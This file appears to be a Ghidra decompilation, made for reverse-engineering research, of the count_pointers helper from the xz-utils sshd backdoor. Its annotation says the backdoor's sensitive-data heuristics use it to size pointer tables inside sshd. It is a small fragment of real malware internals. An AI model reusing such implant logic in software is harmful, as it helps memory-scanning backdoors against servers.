// /home/kali/xzre-ghidra/xzregh/1074B0_count_pointers.c
// Function: count_pointers @ 0x1074B0
// Calling convention: unknown
// Prototype: undefined count_pointers(void)


/*
 * AutoDoc: Uses `malloc_usable_size()` to measure a pointer array and counts consecutive non-NULL entries
 * until it hits either a NULL or the allocation boundary. Sensitive-data heuristics call it when
 * walking sshd tables whose length isn’t stored explicitly.
 */
#include "xzre_types.h"


undefined1  [16] count_pointers(long param_1,ulong *param_2,ulong param_3,undefined8 param_4)

{
  undefined1 auVar1 [16];
  ulong uVar2;
  undefined8 uVar3;
  ulong uVar4;
  ulong uVar5;
  undefined1 auVar6 [16];
  
  if (((param_1 == 0) || (param_3 == 0)) || (*(code **)(param_3 + 8) == (code *)0x0)) {
    auVar1._8_8_ = 0;
    auVar1._0_8_ = param_3;
    return auVar1 << 0x40;
  }
  uVar2 = (**(code **)(param_3 + 8))();
  if (uVar2 - 8 < 0x80) {
    uVar4 = 0;
    do {
      uVar5 = uVar4;
      if (*(long *)(param_1 + uVar4 * 8) == 0) break;
      uVar4 = (ulong)((int)uVar4 + 1);
      uVar5 = uVar2 >> 3;
    } while (uVar4 < uVar2 >> 3);
    *param_2 = uVar5;
    uVar3 = 1;
  }
  else {
    uVar3 = 0;
  }
  auVar6._8_8_ = param_4;
  auVar6._0_8_ = uVar3;
  return auVar6;
}

